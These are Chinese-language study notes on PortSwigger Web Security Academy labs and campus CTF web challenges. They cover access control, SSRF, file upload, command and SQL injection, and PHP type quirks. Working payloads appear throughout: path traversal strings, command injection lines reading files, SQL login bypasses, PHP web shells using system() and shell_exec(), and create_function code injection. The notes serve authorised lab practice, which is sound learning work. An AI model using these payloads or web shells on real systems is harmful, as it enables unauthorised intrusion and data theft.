# CTF / Web 安全 学习笔记

> PortSwigger Web Security Academy —「服务器端漏洞」路径实战记录
> 已通关 13 关（含变体），覆盖 7 个漏洞家族

---

## 一、总览

| # | Lab | 漏洞家族 | 一句话原理 |
|---|---|---|---|
| 1 | 路径遍历（简单案例） | 文件操作 | `/image?filename=` 直接拼进 `readfile()`，用 `../../../` 跳出目录 |
| 2 | 无保护的管理功能 | 访问控制 | `robots.txt` 泄露管理路径，且该路径零鉴权 |
| 3 | 无保护的管理功能（不可预测 URL） | 访问控制 | 路径藏在**前端 JS** 里 |
| 4 | 用户角色由请求参数控制 | 访问控制 | 权限判断读 cookie 里的 `Admin=true` |
| 5 | 用户ID由请求参数控制（不可预测） | 访问控制 | 服务器不校验 URL 里的 `id` 属不属于你 |
| 6 | 用户ID由请求参数控制 → 密码泄露 | 访问控制 | 同上，且响应里回显了密码字段 |
| 7 | 通过不同回复进行用户名枚举 | 认证缺陷 | 报错文案不同 → 泄露用户是否存在 |
| 8 | 2FA 简单绕过 | 认证缺陷 | 密码验证通过就发完整 session，2FA 只是形式 |
| 9 | 针对本地服务器的基础 SSRF | SSRF | 服务器代为请求 `localhost/admin`，来自 loopback |
| 10 | 针对另一个后端系统的基本 SSRF | SSRF | 改请求行路径 + 爆破内网最后一个八位组 |
| 11 | 网页版 shell 上传 RCE | 文件上传 | 前端校验好绕，`.php` 落地即执行 |
| 12 | 操作系统命令注入（简单案例） | 命令注入 | 输入拼进 shell，`;` 分隔多条命令 |
| 13 | SQL 注入 - 允许登录绕过 | SQL 注入 | `'--` 注释掉密码检查 |

**说明**：编号是按学习顺序连续排的（含变体），共 13 行 / 11 个独立关卡。

---

## 二、核心方法论（所有关共用的套路）

| 步骤 | 做什么 | 典型关卡 |
|---|---|---|
| **1. 当正常用户走一遍** | 抓全部请求，看提交了哪些参数 | 所有关 |
| **2. 找「身份标记」** | cookie / URL 参数 / 隐藏字段 / header | 4、5、6 |
| **3. 替换成目标值** | `admin` / `carlos` / 别人的 GUID | 4、5、6 |
| **4. 保持自己的认证** | 用**自己的** session，只改那一个参数 | 5、6 |
| **5. 从原始响应判断成败** | 不看网页渲染，看 Burp 的 Response | 全程 |

### 一句话总结所有关的病根

> **服务器信任了不该信任的东西** —— 客户端的 cookie、URL 参数、Content-Type、文件名、注释符……

---

## 三、身份标记藏在哪（访问控制类通用）

| 藏身之处 | 长什么样 | 怎么找 |
|---|---|---|
| **Cookie** | `Admin=false` / `role=user` / `user_id=3` | 看请求头 Cookie 行 |
| **URL 参数** | `?id=123` / `?user=wiener` / `?role=admin` | 看 URL |
| **隐藏表单字段** | `<input type="hidden" name="role" value="user">` | `Ctrl+U` 看源码 |
| **自定义 header** | `X-User-Role: user` | 看请求头 |
| **API 路径** | `/api/user/123/orders` | 看 URL 里的数字 |
| **前端 JS 变量** | `var isAdmin = false;` | `Ctrl+U` 搜 `admin`/`api` |

### 信息泄露渠道清单（找入口时逐个排查）

```
robots.txt          爬虫指令，常泄露目录
源码注释             <!-- /admin-xxx -->
JavaScript 文件      硬编码的 API 路径
sitemap.xml
响应头 / Cookie
错误信息堆栈
备份文件            .bak / ~ / .git
```

---

## 四、漏洞速查表（识别 → 攻击）

| 漏洞类型 | 识别特征 | 攻击动作 | 关键符号/技巧 |
|---|---|---|---|
| **路径遍历** | URL 里有 `filename=` / `file=` / `path=` | 替换成 `../../../etc/passwd` | `../` 数量 = 爬回根目录的层数，**多了不影响** |
| **无保护管理功能** | 管理页面没登录也能开 | `robots.txt` / 源码里找路径 | 隐蔽性 ≠ 安全 |
| **越权（IDOR）** | URL/cookie 里有 `id` / `role` | 换成目标用户的值 | 保持自己的 session |
| **用户名枚举** | 登录报错文案有差异 | 用 wordlist 批量试，看响应差异 | 比 **Length** 和 **Status** |
| **2FA 绕过** | 密码过了就发 session | 直接访问后续页面 | 半登录状态没被拦截 |
| **SSRF** | 参数值是 URL（`stockApi=`） | 换成内网地址 | `localhost` / `127.1` / 十进制 IP |
| **文件上传 RCE** | 有上传功能 | 传 `.php`，改 `filename` + `Content-Type` | 前端校验改包即绕 |
| **命令注入** | 数字参数被拼进 shell | 加 `; whoami` | `;` `\|` `\|\|` `&&` `&` `` ` `` `$()` |
| **SQL 注入** | 参数拼进 SQL | `'--`（注释）/ `' OR '1'='1` | `-- ` 带空格；MySQL 可用 `#` |

---

## 五、卡点与教训（最重要部分）

| # | Lab | 卡点 | 怎么解决的 | 教训 |
|---|---|---|---|---|
| 1 | 路径遍历 | 抓的是首页不是图片请求；Intercept 开着导致图片没加载；社区版「隐藏图片」把它过滤了 | 关 Intercept → 取消「隐藏图片」→ 搜 `filename` | ① Intercept 用完就关 ② 认准 `filename=` 参数 |
| 2 | 无保护管理功能 | 在首页上改 Referer，方向偏了 | 访问 `robots.txt` 找路径 | **先搞清漏洞类型，再决定动什么工具** |
| 3 | 不可预测 URL | — | `Ctrl+U` 看源码找到 `/admin-0m88gn` | **前端藏路径 ≠ 安全** |
| 4 | 角色由参数控制 | — | 抓包改 `Admin=true` | 权限不能存客户端 |
| 5 | 用户ID不可预测 | **提交答案后跳转，`id` 变回自己的**，误以为失败 | 看 `/submitSolution` 返回 `{"correct":true}` | ⚠️ **被跳转重置参数是高频陷阱** |
| 6 | 密码泄露 | 同上 | 同上 | 同一个坑会重复出现 |
| 7 | 用户名枚举 | — | Intruder 按 Length 排序找异常值 | 状态码/长度差异都是信息泄露 |
| 8 | 2FA 绕过 | 不理解「为什么退回就能登录」 | 服务器在第一步就发完整 session | 认证要分「半登录」和「完整登录」两个状态 |
| 9 | SSRF 本地 | 一开始不行 | 见下方「反复踩的坑」 | **删除操作也必须走 SSRF** |
| 10 | SSRF 内网 | **爆破了 200+ 个 IP 结果全一样** | 路径写成 `/admin`（不是 `/product/stock/check`） | **结果完全一致 = 请求结构错了，不是目标错了** |
| 11 | 文件上传 | **不知道上传的文件在哪** | HTTP history 搜文件名找路径 | 上传成功 ≠ 知道地址 |
| 12 | 命令注入 | 完全没有思路 | 找到 `storeId` 是注入点 | **先找注入点，再想 payload** |
| 13 | SQL 登录绕过 | 以为 `302` 是错误 | 302 + Set-Cookie = 登录成功 | **状态码本身就是信息** |

---

## 六、反复踩的坑（跨关卡通用）

| 坑 | 表现 | 正确做法 |
|---|---|---|
| **跳转重置参数** | 提交后跳转，`id` 变回自己的 | 提交前确认 URL，或看 `/submitSolution` 的 `{"correct":...}` |
| **截图认字符** | `I`/`l`、`E`/`e`、`0`/`O`、`S`/`5` 分不清 | **Ctrl+C 复制，或看源代码 / 原始响应** |
| **Intruder 结果全一样** | 200 多个响应长度完全一致 | **这本身就是「请求结构错了」的信号** |
| **用了旧 session** | 服务器发了新 session 却用旧的手动发包 | **必须用最新返回的那个** |
| **URL 末尾多空格** | `Content-Length` 比预期大 1 | 粘贴后按 `End` 检查 |
| **功能一样但注入点不同** | 都在 `POST /product/stock`，SSRF 改 `stockApi`，命令注入改 `storeId` | **别套用上一关的打法** |
| **社区版 Intruder 限速** | 跑 255 个请求很慢 | 正常，或改用 Python 脚本 |
| **Burp 显示过滤** | 图片请求被「隐藏图片」过滤掉 | 取消勾选，或搜参数名 |
| **前端校验** | 浏览器拦住了上传 | 用 Burp 改包，前端校验形同虚设 |

### 数据源可信度排序（认字符时）

| 数据源 | 可信度 | 原因 |
|---|---|---|
| **网页源代码（Ctrl+U）** | ✅ 最高 | 是字符本身，无渲染、无 CSS 加工 |
| **Burp 原始响应** | ✅ 高 | 服务器返回的字节 |
| **剪贴板复制粘贴** | ✅ 高 | 传的是字节 |
| **人眼读屏幕 / 截图** | ❌ 低 | 字体 + 抗锯齿 + 缩放会骗人 |

---

## 七、Burp 操作速查

| 目的 | 操作 |
|---|---|
| 抓一次请求改包 | `Intercept on` → 改 → `Forward` → **立刻关掉** |
| 反复调试 | 右键 → **Send to Repeater**（`Ctrl+R`） |
| 爆破 | 右键 → **Send to Intruder**（`Ctrl+I`） |
| 找请求 | HTTP history 顶部**搜索框**输入参数名 |
| 看真实响应 | **永远看 Response 区，不看网页渲染** |
| 看页面源码 | 浏览器 `Ctrl+U` |
| 改请求路径 | 改请求行 `GET /path`，**Host 不动** |
| Intruder 数字爆破 | Payloads → Payload type 选 **Numbers** → From/To/Step |

### 请求行 vs Host（重要区分）

```
GET /robots.txt HTTP/2          ← 要哪个【资源】，改这里
Host: xxx.web-security-academy.net   ← 要哪台【服务器】，不动
```

### Intruder 爆破配置模板

```
Payload type:   Numbers
From:           1
To:             255
Step:           1
How many:       1
Number format:  Decimal
Min integer digits: 1
Payload encoding: 关闭（纯数字不需要编码）
```

**结果怎么看**：点 **Status** 或 **Length** 列头排序，找「和大多数不一样」的那一行。

---

## 八、三个万能提问（卡住时问自己）

```
① 这个功能的【输入】是什么？（哪个参数）
② 服务器拿它去做什么？
      拼 SQL  / 拼 shell 命令 / 发 HTTP 请求 / 存文件
③ 哪个字符能【打破这个结构】？
      拼 SQL   →  '  --  #
      拼命令   →  ;  |  ||  &&  &  ``  $()
      发请求   →  换 URL / 换 IP 写法
      存文件   →  换扩展名 / 换 Content-Type / 加文件头
```

---

## 九、常用 payload 速查

### 路径遍历

```
../../../etc/passwd        ← 3 个 ../ 爬回根（视目录深度调整）
/etc/passwd                ← 绝对路径（是否可用看具体实现）
....//....//etc/passwd     ← 绕过 ../ 过滤
%2e%2e%2f                  ← URL 编码绕过
```

### 命令注入

```
1; whoami
1| whoami
1|| whoami
1&& whoami
1& whoami
1`whoami`
1$(whoami)
1%0a whoami                ← 换行符

1; cat /home/carlos/secret
1; sleep 10                ← 盲注：用时间延迟判断
```

### SQL 注入

```
administrator'--                  ← 登录绕过（注释掉密码检查）
administrator'#                   ← MySQL 另一种注释
' OR '1'='1                       ← 经典永真
' ORDER BY 1--                    ← 判断列数
' UNION SELECT NULL,NULL--        ← 联合查询探列
```

### SSRF 的 IP 写法

```
http://localhost/admin
http://127.0.0.1/admin
http://127.1/admin                ← 简写，常用
http://0.0.0.0/admin
http://[::1]/admin                ← IPv6
http://2130706433/admin           ← 127.0.0.1 的十进制形式
http://0177.0.0.1/admin           ← 八进制
```

### 文件上传的伪装

```
GIF89a                            ← GIF 文件头，绕过文件头校验
<?php echo file_get_contents('/path/to/secret'); ?>
```

**PHP Web Shell 三种等价写法：**

```php
<?php echo file_get_contents('/path/to/file'); ?>
<?php system('cat /path/to/file'); ?>
<?php echo shell_exec('cat /path/to/file'); ?>
```

**先验证 shell 可用再读目标文件：**

```php
<?php echo "SHELL_OK"; ?>
```

---

## 十、文件特征（文件头 / 魔数）

| 类型 | 文件头（十六进制） | 可见字符 |
|---|---|---|
| JPEG | `FF D8 FF` | — |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |

**用途**：判断服务端是否校验真实内容；构造「图片马」时加在 PHP 代码前面。

---

## 十一、MIME 类型速查

| 类型 | 含义 |
|---|---|
| `image/jpeg` | JPEG 图片 |
| `image/png` | PNG 图片 |
| `image/gif` | GIF 图片 |
| `text/html` | HTML 页面 |
| `application/json` | JSON 数据 |
| `application/x-php` | PHP 文件 |
| `application/octet-stream` | **未知二进制（兜底类型）** |

**关键认知**：`Content-Type` 是**客户端自称**的，可以随便改。服务端只看它就判断文件类型 = 被骗。

---

## 十二、认证与 2FA 的正确实现要点

```
第一步：密码验证通过  →  只标记「半登录」，不能给完整权限
第二步：2FA 验证通过  →  才发放完整 session

必须同时具备：
  ① 中间状态标记（区分「密码过了」和「完全登录」）
  ② 全局拦截检查（每个受保护页面都校验这个标记）
```

**漏洞本质**：2FA 被做成「建议」而不是「门禁」。

---

## 十三、安全设计原则（从这些 lab 反推）

| 原则 | 反例（lab 里的错法） |
|---|---|
| 权限判断必须在服务端 | `Admin=true` 存 cookie |
| 权限必须绑定「你是谁」，不能绑定「你从哪来」 | `remote_addr == 127.0.0.1` 就放行 |
| 敏感字段的可见性由「登录者」决定 | URL 里的 `id` 决定给谁看密码 |
| 隐藏 ≠ 保护 | 前端 JS 藏管理路径 |
| 每个受保护资源独立校验 | 只检查第一步，后续步骤不管 |
| 检查文件真实内容，不信客户端声明 | 只看 `Content-Type` |
| 参数化查询，不拼接 | SQL 字符串拼接 |
| 不用 shell 拼接用户输入 | `shell_exec("cmd " . $input)` |
| 规范化路径后再校验 | 直接拼接文件路径 |

---

## 十四、进度追踪

### 已通关（11 关 / 7 个家族）

```
✅ 路径遍历（简单案例）                    → 文件操作
✅ 无保护的管理功能 ×2                    → 访问控制
✅ 用户角色由请求参数控制                  → 访问控制
✅ 用户ID由请求参数控制（不可预测 + 密码泄露）→ 访问控制
✅ 用户名枚举                            → 认证缺陷
✅ 2FA 简单绕过                          → 认证缺陷
✅ 针对本地服务器的基础 SSRF              → SSRF
✅ 针对另一个后端系统的基本 SSRF          → SSRF
✅ 通过网页版 shell 上传进行远程代码执行   → 文件上传
✅ 操作系统命令注入（简单案例）            → 命令注入
✅ SQL 注入 - 允许登录绕过                → SQL 注入
```

### 待攻克方向

```
□ 路径遍历变体：遍历序列被阻止 / 被剥离 / 绝对路径 / 扩展名验证
□ 访问控制：请求体中的ID / Referer绕过 / X-Original-URL绕过 / 方法绕过
□ 信息泄露：调试页面 / 备份文件 / 版本控制历史 / 错误消息 / 响应头
□ 认证：响应时间枚举 / 2FA逻辑缺陷 / 密码重置缺陷 / 保持登录cookie / 暴力破解绕过
□ SSRF：过滤器绕过（黑名单 / 白名单）
□ 文件上传：Content-Type绕过 / 黑名单扩展名 / .htaccess / 竞态条件
□ 命令注入：盲注（时间延迟 / 输出重定向 / 带外数据）
□ SQL 注入：联合查询 / 报错注入 / 布尔盲注 / 时间盲注 / 带外
□ SSTI 服务端模板注入
□ 反序列化（PHP / Java）
□ JWT 攻击（alg:none / 密钥爆破 / 算法混淆）
```

---

## 十五、学习节奏建议

```
每周：PortSwigger lab 6-10 个（按路径顺序打，别跳）
每个 lab 记三样东西：
   ① 漏洞原理（一句话）
   ② 我的 payload（原文）
   ③ 为什么这样构造（思维过程）← 最重要
```

### 教学 lab 与真实 CTF 的区别

| | PortSwigger lab | 真实 CTF |
|---|---|---|
| 漏洞数量 | 通常 **1 个** | **多个串联** |
| 提示 | 有明确描述和目标 | 往往什么都没有 |
| 入口 | 直接告诉你改哪个参数 | 先要自己找到入口 |

**PortSwigger 教「零件」，真实 CTF 考「组装」。**

---

## 十六、合法边界（必须牢记）

```
✅ 可以打：CTF 平台、官方授权靶场、自己搭的环境
❌ 不能打：任何未授权的真实站点

中国法律：《刑法》285 条（非法侵入计算机信息系统）
          《刑法》286 条（破坏计算机信息系统）
```

---

## 附录：环境备忘

| 项目 | 值 |
|---|---|
| 靶场 | PortSwigger Web Security Academy |
| 工具 | Burp Suite Community v2026.8 |
| 内置浏览器 UA | Firefox 152.0 |
| 学习路径 | 服务器端漏洞 |
| 账户凭据 | `wiener` / `peter` |
| 目标用户 | `carlos` |

---

## 十七、校赛真题复盘（去年 Web 四题）

> flag 格式：`NBUTCTF{uuid}`
> 本地复刻靶场：`E:\dsh\php-lab`（`.\start.ps1` 启动，`.\test.ps1` 验证）
> 详细突击资料见：`E:\dsh\校赛Web突击讲义.md`

### 17.1 考点地图

| 题 | 考点 | 解法要点 |
|---|---|---|
| `Ez_game` | 前端源码泄漏 | `Ctrl+U` → 找 `game.js` → base64 解码 |
| `ez_rand` | PHP 伪随机可预测 | `mt_srand(5201314)` 固定种子 → 本地算 `mt_rand()` |
| `rce` | MD5强比较 + intval + create_function | 碰撞字符串 + `dad=2024` + `}SYSTEM(...);/*` |
| `Upload` | GIF89a 文件头 + 文件名过滤 | 加 `GIF89a` 前缀 + 文件名避开字母 `a` |

**关键结论：4 题里 3 题考 PHP 语言特性。**

### 17.2 ez_rand —— 固定种子可预测

```php
mt_srand(5201314);
$rand = mt_rand();
if ($rand == $_GET['key']) eval($_POST['cmd']);
```

**解法：**

```bash
php -r 'mt_srand(5201314); echo mt_rand();'    # => 1304794112
```

然后 `GET /?key=1304794112` + `POST cmd=system('cat /f*');`

**同类变体：** 种子若是 `time()`，用 `php_mt_seed` 反推或爆破时间窗口。

### 17.3 rce —— 三关串联

**第 1 关：MD5 强比较**（`(string)$a !== (string)$b` 且 `md5($a) === md5($b)`）

只能用**已知碰撞字符串对**（两串仅第 22 字符不同：`A` vs `E`）：

```
TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
```

**第 2 关：intval 特性**

```php
intval($dad) < 2025 && intval($dad) + 1 >= 2025 && strlen($dad) <= 5
```

→ `dad=2024`（`intval` 的真实行为要**本地实测**，别凭记忆：`intval("1e6")` 在 PHP 7.4 是 `1000000` 而不是 `1`）

**第 3 关：create_function 代码注入**

`create_function($args, $code)` 的第二个参数会被当 PHP 代码编译，payload 结构是**闭合 + 注释**：

```php
}SYSTEM('type flag');/*
 ↑                 ↑
} 闭合原函数体      /* 注释掉尾部残留
```

**完整请求：**

```
GET  ?boy=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
     &you_are_good=}SYSTEM('type flag');/*
POST girl=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
Cookie: dad=2024; mom=\create_function
```

### 17.4 Upload —— 文件名过滤的陷阱

**服务端：** 检查文件头必须是 `GIF89a`；文件名不能含字母 `a`。

**上传请求：**

```
Content-Disposition: form-data; name="fileToUpload"; filename="s.php"
Content-Type: image/jpg

GIF89a
<?= file_get_contents('../flag');?>
```

**⚠️ 一个重要判断：过滤到底作用在哪？**

| 过滤位置 | 表现 | 绕过 |
|---|---|---|
| **文件名** | 内容里的 `a` 没事 | 换文件名（`s.php`、`nl.php`） |
| **文件内容** | 连 `GIF89a` 都会被拦 | 那就没法加文件头了 → 说明不是内容过滤 |

去年那题从结果看是**文件名过滤**——访问后返回 `GIF89a 1 NBUTCTF{...}`，证明内容里的 `GIF89a` 原样保留了。

### 17.5 去年暴露的坑（写进检查清单）

| 坑 | 正确做法 |
|---|---|
| 从前端渲染读 flag，`I`/`l`、`E`/`e` 分不清 | **从 Burp 的 Response 复制** |
| `function_exists()` 对字符串**大小写敏感** | 函数名必须用正确大小写（`create_function` ≠ `CREATEFUNCTION`） |
| Linux/Windows 命令不通用 | `nl`/`cat` 是 Linux；Windows 用 `type`，且 `type` 不支持通配符 |
| 过滤范围没确认就猜 | 先判断过滤作用在**文件名**还是**内容** |
| PHP 版本差异 | `create_function` PHP 8 已移除；`"abc"==0` PHP 8 变 false |

### 17.6 本地靶场（已实测可用）

```
E:\dsh\php-lab\
├── start.ps1      启动（端口 9000）
├── test.ps1       一键验证，应输出 PASS: 9  FAIL: 0
├── ez_game.php + game.js
├── ez_rand.php
├── rce.php
├── upload.php + upload/
└── flag           靶场 flag
```

PHP 环境：`E:\dsh\tools\php74\php.exe`（PHP 7.4.33，含 `create_function`）

---

## 十八、2026 校赛复盘精华（知识点总结）

> 来源：2026 省赛选拔赛 Web 方向两题 —— Web-1「最简单的签到」/ Web-2「ez rce」
> 完整题解 PDF：`E:\dsh\wp2\WP-NBUT2026-Web.pdf`

### 18.1 两题速览

| 题目 | 考点链 | 关键 payload |
|---|---|---|
| **Web-1 最简单的签到** | dirsearch 扫目录 → `php://filter` 读源码 → 代码审计 → MD5 强比较 → PHP 整数溢出 | TEXTCOLL 碰撞对 + `9223372036854775807` 与 `1` |
| **Web-2 ez rce** | 命令注入 → 关键词过滤绕过 → 通配符 | `c'a't /f*` |

**共性**：两题都不是靠盲试 payload 解出来的，而是**先拿到源码或确认过滤规则，再针对每一条校验条件找对应技巧**。

---

### 18.2 信息收集：dirsearch 常用命令

Web-1 的入口完全靠目录扫描发现，题目里「旧目录」这种描述几乎就是在提示扫目录。

| 目的 | 命令 |
|---|---|
| 基础扫描 | `dirsearch -u http://target/` |
| 指定扩展名（最常用） | `dirsearch -u http://target/ -e php,html,txt,zip,bak` |
| 指定字典 + 线程数 | `dirsearch -u http://target/ -w /usr/share/wordlists/dirb/common.txt -t 30` |
| 递归扫子目录 | `dirsearch -u http://target/ -r` |
| 只看 200 / 403 | `dirsearch -u http://target/ -i 200,403` |
| 排除干扰状态码 | `dirsearch -u http://target/ -x 404,400` |
| 走 Burp 代理看请求 | `dirsearch -u http://target/ --proxy http://127.0.0.1:8080` |
| 结果存文件 | `dirsearch -u http://target/ -o result.txt` |

**重点看返回 `200`、`301`、`403` 的路径**，尤其是 `/backup`、`/admin`、`/.git`、`/www.zip` 这类高危目录。

> Kali 里已预装 dirsearch；字典在 `/usr/share/wordlists/dirb/`，全量字典用 `seclists`（`apt install seclists`）。

---

### 18.3 读源码的常用伪协议

直接访问 PHP 文件看到的是执行结果，看不到源码。有文件包含（LFI）时用伪协议读：

| 伪协议 | 用途 | 示例 |
|---|---|---|
| **`php://filter`** | 把文件内容编码后输出，绕开 PHP 解析 | `php://filter/convert.base64-encode/resource=gate.php` |
| `php://input` | 读取 POST 原始 body | `include('php://input')` |
| `data://` | 直接构造内容 | `data://text/plain,<?php ...?>` |

**标准操作**：

```
?file=php://filter/convert.base64-encode/resource=gate.php
```

URL 编码后：

```
?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dgate.php
```

返回的 base64 解码即得源码。

**原理**：`php://filter` 是 PHP 的流过滤器，先把目标文件经过 `convert.base64-encode` 转换再输出，所以原本会被执行的源码变成了纯文本。

---

### 18.4 PHP 弱类型绕过对照

| 校验写法 | 能否绕过 | 绕过方法 |
|---|---|---|
| `md5($a) == md5($b)` | ✅ 能 | **0e 魔术哈希**：`QNKCDZO` 与 `240610708` |
| `md5($a) === md5($b)` | ✅ 能 | **真实 MD5 碰撞字符串对**（TEXTCOLL，仅第 22 字符 `A`/`E` 不同） |
| `md5($a) === md5($b)` 且 `is_string()` 校验 | ✅ 能 | 仍用碰撞对 —— **数组绕不过 `is_string()`** |
| 两个正数相加 `< 0` | ✅ 能 | **整数溢出**：`PHP_INT_MAX` 与 `1` 相加 |

> 补充：`"abc" == 0` 在 PHP 8 已变为 `false`，弱类型类技巧要先确认目标 PHP 版本。

---

### 18.5 整数溢出：两个正数为什么会得到负数

**先记结论：PHP 里两个正整数直接相加，不会得到负数 —— 而是会自动变成浮点数。**

```php
PHP_INT_MAX + 1        →  float(9.2233720368548E+18)   // 浮点，不是负数
9223372036854775800 + 100  →  float(9.2233720368548E+18)
```

**只有把超范围的浮点数强制转回 `int` 时，才会回绕成负数**：

```php
(int)(PHP_INT_MAX + 1)              →  -9223372036854775808
(int)(9223372036854775800 + 100)    →  负数
```

**整数范围**：

| 平台 | 判断方式 | 范围 |
|---|---|---|
| **64 位** | `PHP_INT_SIZE == 8` | −9223372036854775808 ~ **9223372036854775807**（2^63−1） |
| **32 位** | `PHP_INT_SIZE == 4` | −2147483648 ~ **2147483647**（2^31−1） |

**⚠️ 最易混的一点：字符串和浮点数的行为相反**

| 输入类型 | 越界转 `int` 的结果 |
|---|---|
| **浮点数 float** | **回绕 → 可能是负数** |
| **字符串 string** | **饱和 → `PHP_INT_MAX`（正数）** |

```php
(int)1e19                     →  -8446744073709551616   // 浮点 → 负数
(int)'1e19'                  →  9223372036854775807    // 字符串 → 正数
(int)'99999999999999999999'  →  9223372036854775807    // 同上
```

**所以实战中：**

- 原始提交的数字**本身不能超出整数范围**，否则解析阶段就被饱和成 `PHP_INT_MAX`
- 要拿到负数，必须让值先经过一次**算术运算变成 float**，再被转回 `int`
- `$_GET` 取到的永远是字符串，`intval($_GET['x'])` 是饱和（正数）；`intval($_GET['x'] * 1)` 才是回绕（可能负数）

---

### 18.6 命令注入的关键词绕过

| 过滤情况 | 绕过手法 | 示例 |
|---|---|---|
| 命令名被过滤 | **引号拆分** | `c'a't /flag` |
| 命令名被过滤 | **变量拼接** | `a=c;b=at;$a$b /flag` |
| 文件名被过滤 | **通配符** | `cat /f*` |
| 空格被过滤 | 特殊变量替代 | `cat${IFS}/flag` |
| 分隔符被过滤 | 换分隔符 | `;` `\|` `\|\|` `&&` `&` 反引号 |
| 整个命令被过滤 | 换等价命令 | `head` / `more` / `sort` / `nl` / `tac` |

**Web-2 的思路**：过滤了 `cat` 和 `flag`，于是

```
c'a't /f*        ← 引号拆分绕过 cat，通配符绕过 flag
```

**为什么管用**：引号在传给 shell 时会被去掉，命令仍然成立；而 `/f*` 由 shell 负责通配符展开，payload 里始终不出现 `flag` 字样。

---

### 18.7 可复用的解题顺序

```
① 读题      → 题目描述里每句提示都要当真（「旧目录」= 要扫目录）
② 扫目录    → dirsearch 跑一遍，看 200 / 301 / 403
③ 找源码    → 有 LFI 用伪协议读；有备份文件下回来审计
④ 审计      → 找危险函数（include / eval / system）和所有 if 校验条件
⑤ 逐条绕过  → 每条校验条件对应一个已知技巧（弱类型 / 溢出 / 过滤绕过）
⑥ 拼 flag   → 把每段答案组合提交
```

**一句话总结**：

> 先拿到源码或确认过滤规则，再针对每一条校验条件找对应的绕过技巧。**盲目试 payload 的效率远低于先读代码。**

---

### 18.8 与本笔记其他章节的对应

| 本笔记章节 | 与本复盘的关系 |
|---|---|
| 九、常用 payload 速查 | 命令注入分隔符、路径遍历 payload 的完整版 |
| 十七、校赛真题复盘（2025） | 去年四题的复盘，TEXTCOLL 碰撞对来源 |
| 十八 18.5 整数溢出 | 与 2025 卷「两正数和 < 0」同源 |

> 2025 与 2026 两届都考了「PHP 特性组合」：MD5 强比较 + 整数溢出。**这是该校赛的固定套路，值得背熟。**

